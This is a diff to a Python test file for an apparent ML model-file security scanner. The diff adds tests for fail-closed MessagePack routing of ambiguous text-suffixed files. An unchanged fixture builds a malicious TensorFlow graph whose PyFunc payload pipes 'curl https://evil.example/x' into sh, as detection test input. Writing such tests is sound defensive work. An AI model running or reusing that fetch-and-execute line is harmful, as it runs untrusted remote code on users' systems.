@@ -40,7 +40,6 @@ from tests.helpers import (
     prefix_mock_onnx_with_unknown_field,
     prefix_mock_onnx_with_unknown_group,
 )
-from tests.helpers.file_creators import valid_jpeg_bytes
 
 
 def _require_tf_protos() -> None:
@@ -60,6 +59,16 @@ def _build_malicious_tf_metagraph() -> bytes:
     node.op = "PyFunc"
     node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
     return cast(bytes, metagraph.SerializeToString())
+
+
+def _build_printable_utf8_ambiguous_binary_route() -> bytes:
+    """Build printable UTF-8 bytes that still require binary fail-closed routing."""
+    return (b'""' + ("é" * 17).encode("utf-8")) * 4097
+
+
+def _build_line_broken_printable_utf8_ambiguous_binary_route() -> bytes:
+    """Build line-broken printable UTF-8 bytes requiring binary fail-closed routing."""
+    return (b'""' + ("é" * 17).encode("utf-8") + b"\n") * 4097
 
 
 def _build_malicious_tf_savedmodel() -> bytes:
@@ -533,6 +542,42 @@ class TestDirectoryFileFiltering:
         assert results["files_scanned"] == 0
         assert "flax_msgpack" not in results.scanner_names
 
+    @pytest.mark.parametrize("filename", ["ambiguous.txt", "settings.conf"])
+    @pytest.mark.parametrize(
+        "prefix",
+        [b": a\n", b"a:\n"],
+        ids=["colon-space-value", "key-colon"],
+    )
+    def test_structure_prefixed_text_suffix_messagepack_candidate_is_scanned_in_directory(
+        self,
+        tmp_path: Path,
+        filename: str,
+        prefix: bytes,
+    ) -> None:
+        candidate = tmp_path / filename
+        candidate.write_bytes(prefix + _build_printable_utf8_ambiguous_binary_route())
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 2
+        assert any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
+    def test_key_prefixed_line_broken_text_suffix_messagepack_candidate_is_scanned_in_directory(
+        self,
+        tmp_path: Path,
+    ) -> None:
+        candidate = tmp_path / "ambiguous.conf"
+        candidate.write_bytes(b"key:\n" + _build_line_broken_printable_utf8_ambiguous_binary_route())
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "flax_msgpack" in results.scanner_names
+        assert determine_exit_code(results) == 2
+        assert any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
     def test_large_json_array_under_skipped_suffix_is_scanned_fail_closed(self, tmp_path: Path) -> None:
         json_array = tmp_path / "metadata.jpg"
         json_array.write_bytes(b"[" + b"0," * ((MXNET_SYMBOL_SIGNATURE_READ_BYTES // 2) + 100) + b"0]")
@@ -775,7 +820,7 @@ class TestDirectoryFileFiltering:
     def test_real_images_remain_skipped(self, tmp_path: Path) -> None:
         """Content sniffing should not promote ordinary media files into the scan set."""
         image_path = tmp_path / "cover.jpg"
-        image_path.write_bytes(valid_jpeg_bytes())
+        image_path.write_bytes(b"\xff\xd8\xff\xe0" + b"jpeg")
 
         results = scan_model_directory_or_file(str(tmp_path))
 
